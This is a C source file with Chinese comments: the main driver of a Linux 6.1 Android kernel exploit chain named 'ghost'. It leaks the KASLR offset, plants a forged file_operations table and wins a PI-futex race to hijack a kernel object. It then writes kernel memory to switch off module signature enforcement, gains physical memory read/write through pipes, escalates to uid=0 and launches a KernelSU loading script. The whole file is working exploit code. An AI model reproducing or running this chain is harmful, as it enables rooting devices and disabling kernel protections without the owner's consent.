/* main.c — 6.1 ghost 链路入口（照参考 exploit_main 0x626b78 的顺序编排）
 *
 * 参考顺序：
 *   init_ashmem_path → get_kaslr_offset → 装伪造 fops → run_one(stage1)
 *   → is_kernel_ptr 校验 → run_one(stage2) → 写 r+0x210 → sig_enforce 校验
 *   → data_addr → install_pipe_physrw → install_android_root
 * 拿到 uid=0 之后接我们自己的 ksud late-load（不内嵌 LKM）。
 *
 * 未标定的 build（缺 KASLR 指纹 / init_task / 竞态锚点 / fops 文字地址）一律拒跑并返回 2：
 * 宁可不跑，也不拿猜出来的 .data 地址去写内核（panic_on_oops=1 会整机重启）。
 */
#define _GNU_SOURCE
#include "ghost.h"
#include "map_6.1.h"

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#define EXIT_UNSUPPORTED 2
#define EXIT_ASHMEM 3
#define EXIT_KASLR 4
#define EXIT_RACE 5
#define EXIT_SIGENFORCE 6
#define EXIT_PHYSRW 7
#define EXIT_CRED 8

static int arg_check(int argc, char **argv)
{
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "check") == 0) return 1;
        if (strcmp(argv[i], "fake") == 0) return 2;
        if (strcmp(argv[i], "selftest") == 0) return 3;
        if (strcmp(argv[i], "mgrprobe") == 0) return 4;
        if (strcmp(argv[i], "leak") == 0) return 5;
    }
    return 0;
}

/* 未加 slide 的绝对地址（map 里存的是 KIMAGE 基址下的值） */
static uint64_t U(uint64_t unslid) { return unslid + g.slide; }

static int map_ready(char *why, size_t n)
{
    if (!g_map->nfp || !g_map->fp) { snprintf(why, n, "no kaslr fingerprints"); return 0; }
    if (!g_map->init_task) { snprintf(why, n, "no init_task"); return 0; }
    if (!g_map->task_tasks) { snprintf(why, n, "no task_struct.tasks offset"); return 0; }
    for (int i = 0; i < 5; i++)
        if (!g_map->race[i]) { snprintf(why, n, "no race anchor #%d", i); return 0; }
    for (int i = 0; i < 6; i++)
        if (!g_map->fops[i]) { snprintf(why, n, "no fops text address #%d", i); return 0; }
    return 1;
}

static void install_fake_fops(void)
{
    memset(g_fops, 0, sizeof(g_fops));
    *(uint64_t *)(g_fops + 0x08) = U(g_map->fops[0]);
    *(uint64_t *)(g_fops + 0x20) = U(g_map->fops[1]);
    *(uint64_t *)(g_fops + 0x28) = U(g_map->fops[2]);
    *(uint64_t *)(g_fops + 0x50) = U(g_map->fops[3]);
    *(uint64_t *)(g_fops + 0x58) = U(g_map->fops[4]);
    *(uint64_t *)(g_fops + 0x60) = U(g_map->fops[5]);
    *(uint64_t *)(g_fops + 0x70) = U(g_map->fops[5]) + 0x230;
    *(uint64_t *)(g_fops + 0x80) = U(g_map->fops[5]) + 0x2b8;
    *(uint64_t *)(g_fops + 0xe0) = U(g_map->fops[0]) + 0x1c0;
}

/* 一次竞态 = 设好 tri 后跑 ghostlock_main（三线程 PI-futex 路由） */
static uint64_t ghost_run_one(uint64_t parent, uint64_t left, uint64_t right)
{
    g_cfg[0] = parent;
    g_cfg[1] = left;
    g_cfg[2] = right;
    LOG("[*] stage %u: parent=%#llx left=%#llx right=%#llx",
        (unsigned)g_stage, (unsigned long long)parent, (unsigned long long)left,
        (unsigned long long)right);
    long r = (long)ghostlock_main();
    LOG("[*] %#lx", (unsigned long)r);
    return (uint64_t)r;
}

/* 交给我们的 stage 脚本做 ksud late-load（ksud 由我方拉取，不用内嵌 ko） */
int handoff_ksu(const char *mgr, const char *stage_in, const char *app_root)
{
    (void)app_root;
    const char *stage = stage_in && *stage_in ? stage_in : getenv("EXTRACTKIT_STAGE");
    if (!stage || !*stage) stage = "/data/local/tmp/extract-kit/ksu_stage.sh";
    LOG("[ksu] handoff script=%s", stage);
    pid_t p = fork();
    if (p == 0) {
        setenv("EXTRACTKIT_MGR", mgr ? mgr : "", 1);
        execl("/system/bin/sh", "sh", stage, (char *)NULL);
        _exit(127);
    }
    int st = 0;
    waitpid(p, &st, 0);
    LOG("[ksu] stage exit=%d", st);
    return st == 0 ? 0 : -1;
}

int main(int argc, char **argv)
{
    char why[96];
    int mode;

    memset(&g, 0, sizeof(g));
    g.verbose = getenv("EXTRACTKIT_VERBOSE") ? 1 : 0;

    static struct utsname un;
    const char *rel = getenv("EXTRACTKIT_RELEASE");
    if ((!rel || !*rel) && uname(&un) == 0) rel = un.release;
    g_map = ghost_map_pick(rel);
    if (!g_map) {
        LOG("[!] ghost: kernel %s has no calibrated profile; refusing to run", rel ? rel : "?");
        return EXIT_UNSUPPORTED;
    }
    LOG("[payload] family=6.1 chain=ghost release=%s", g_map->release);

    mode = arg_check(argc, argv);
    if (mode == 3) {
        LOG("[selftest] nfp=%d fp=%p init_task=%#llx tasks=%#x race0=%#llx fops0=%#llx",
            g_map->nfp, (const void *)g_map->fp, (unsigned long long)g_map->init_task,
            g_map->task_tasks, (unsigned long long)g_map->race[0],
            (unsigned long long)g_map->fops[0]);
        if (!map_ready(why, sizeof(why))) {
            LOG("[!] ghost unsupported: %s (release=%s)", why, g_map->release);
            return EXIT_UNSUPPORTED;
        }
        /* perf 预检：真机一眼区分「perf 被拦」和「后续阶段失败」 */
        (void)perf_selftest();
        LOG("[+] selftest ready (release=%s)", g_map->release);
        return 0;
    }

    if (!map_ready(why, sizeof(why))) {
        LOG("[!] ghost unsupported: %s (release=%s)", why, g_map->release);
        return EXIT_UNSUPPORTED;
    }

    if (open_ashmem_device() < 0) {
        LOG("[!] ashmem open failed");
        return EXIT_ASHMEM;
    }
    g.h = g.fd_ashmem;

    if (get_kaslr_offset(&g.kbase) != 0) {
        LOG("[!] kaslr offset failed");
        return EXIT_KASLR;
    }
    LOG("[+] kbase=%#llx slide=%#llx init_task=%#llx",
        (unsigned long long)g.kbase, (unsigned long long)g.slide,
        (unsigned long long)g.init_task);
    install_fake_fops();

    /* stage1：parent = fake_lock+8，left = .data 锚点 1 */
    g_stage = 1;
    g_fake_lock_addr = U(g_map->race[0]);
    uint64_t r = ghost_run_one(g_fake_lock_addr + 8, U(g_map->race[1]), 0);
    if (!is_kptr(r)) {
        LOG("[!] stage1 returned non-kernel pointer: %#llx", (unsigned long long)r);
        return EXIT_RACE;
    }

    /* stage2：parent = r+0x208，left = .data 锚点 2 */
    g_fake_lock_addr += 0x20;
    g_stage = 2;
    if (!ghost_run_one(r + 0x208, U(g_map->race[2]), 0)) {
        LOG("[!] stage2 failed");
        return EXIT_RACE;
    }

    /* 把 fake fops 的地址写进被劫持对象 +0x210 */
    uint64_t fops_ptr = U(g_map->fops[0]);
    if (kernel_write_data(g.h, r + 0x210, &fops_ptr, 8) != 0) {
        LOG("[!] fops pointer write failed");
        return EXIT_RACE;
    }

    /* sig_enforce：0 表示已关；1 表示开着（写回 0 再走） */
    uint32_t se = 0xffffffffu;
    if (kernel_read_data(g.h, U(g_map->race[3]), &se, 4) != 0) {
        LOG("[!] sig_enforce read failed");
        return EXIT_SIGENFORCE;
    }
    if (se == 1) {
        uint32_t zero = 0;
        if (kernel_write_data(g.h, U(g_map->race[3]), &zero, 4) != 0) {
            LOG("[!] sig_enforce write failed");
            return EXIT_SIGENFORCE;
        }
        LOG("[+] sig_enforce reset");
    } else if (se != 0) {
        LOG("[!] not valid sig_enforce %x", se);
        return EXIT_SIGENFORCE;
    }

    LOG("[+] ashmem fd %d", g.h);
    /* 参考在这里清 4 KiB（U(race[0])）。锚点未在本 build 上实测过之前不清：
     * 写错一页 .data 会直接 Oops（panic_on_oops=1 整机重启）。 */
    LOG("[*] skip 4KiB clear at fake_lock (anchor not verified on this build)");

    if (ghost_boot_page_off() != 0) return EXIT_PHYSRW;
    if (!install_pipe_physrw(g.h)) return EXIT_PHYSRW;

    if (mode == 5) {
        uint64_t v = 0;
        if (kernel_read64(g.h, g.init_task, &v) == 0)
            LOG("[leak] init_task[0]=%#llx", (unsigned long long)v);
        return 0;
    }

    if (install_android_root() != 0) {
        LOG("[!] install_android_root failed");
        return EXIT_CRED;
    }
    if (getuid() == 0) LOG("[+] uid=0");

    handoff_ksu(getenv("EXTRACTKIT_MGR"), NULL, getenv("EXTRACTKIT_APP_ROOT"));
    reset_pipe_attempt();
    sysctl_destroy();
    return 0;
}
